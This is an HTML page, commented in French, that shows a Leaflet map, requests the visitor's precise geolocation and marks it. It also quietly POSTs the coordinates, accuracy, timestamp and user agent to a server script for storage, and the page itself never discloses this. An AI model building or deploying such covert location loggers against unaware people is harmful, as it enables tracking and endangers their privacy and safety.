<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Geo Map</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<style>
  html, body { height:100%; margin:0; }
  #map { width:100%; height:100%; }
  .leaflet-popup-content { font-size:14px; }
</style>
</head>
<body>
<div id="map"></div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script>
const API_URL = "post_geo.php"; // PHP pour enregistrer la localisation

// Initialisation Leaflet map
const map = L.map('map').setView([0,0], 2); // centrée par défaut
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap contributors'
}).addTo(map);

function postLocation(data){
    fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(e => console.error(e));
}

function success(pos){
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const acc = pos.coords.accuracy;
    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

    // afficher sur la carte
    map.setView([lat, lon], 15);
    L.marker([lat, lon]).addTo(map)
        .bindPopup("Vous êtes ici !<br><a href='"+mapsLink+"' target='_blank'>Voir sur Google Maps</a>")
        .openPopup();

    // envoyer au PHP
    postLocation({
        lat: lat,
        lon: lon,
        accuracy_m: acc,
        timestamp: pos.timestamp,
        userAgent: navigator.userAgent,
        origin: window.location.origin,
        maps_link: mapsLink
    });
}

function error(err){
    console.error("Erreur géoloc :", err);
    alert("Impossible d'obtenir votre localisation : " + err.message);
}

// demander la géolocalisation
if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy:true });
} else {
    alert("Votre navigateur ne supporte pas la géolocalisation.");
}
</script>
</body>
</html>
